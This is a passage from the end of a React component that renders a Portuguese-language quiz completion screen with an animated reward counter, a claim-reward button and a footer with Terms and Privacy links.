                <h2 className="text-4xl sm:text-3xl font-bold text-white mb-3 sm:mb-2">
                  Parabéns!
                </h2>
                
                <p className="text-white text-xl sm:text-lg mb-5 sm:mb-4">
                  Você completou o quiz e ganhou
                </p>
                
                <div className="text-6xl sm:text-5xl font-bold text-yellow-300 mb-5 sm:mb-4 relative overflow-visible drop-shadow-lg">
                  <AnimatedCounter start={0} end={lastQuizReward} duration={2500} />
                </div>
                
                <p className="text-white text-base sm:text-sm mb-8 sm:mb-6 opacity-90">
                  Obrigado por participar da nossa pesquisa!
                </p>
                
                <button 
                  onClick={handleReceiveReward}
                  className="w-full bg-white text-gray-800 py-4 sm:py-3 px-6 rounded-full font-semibold text-lg sm:text-base hover:bg-gray-100 transition-colors shadow-lg"
                >
                  Receber recompensa
                </button>
              </div>
            </div>
          </>
        )}

        <div className="border-t p-5 sm:p-4 text-center text-base sm:text-sm text-gray-500">
          <small>© 2025 — Todos os direitos reservados</small>
          <div className="mt-3 sm:mt-2">
            <a href="#" className="hover:underline" style={{ color: '#FF4D70' }}>Termos</a> | <a href="#" className="hover:underline" style={{ color: '#FF4D70' }}>Privacidade</a>
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;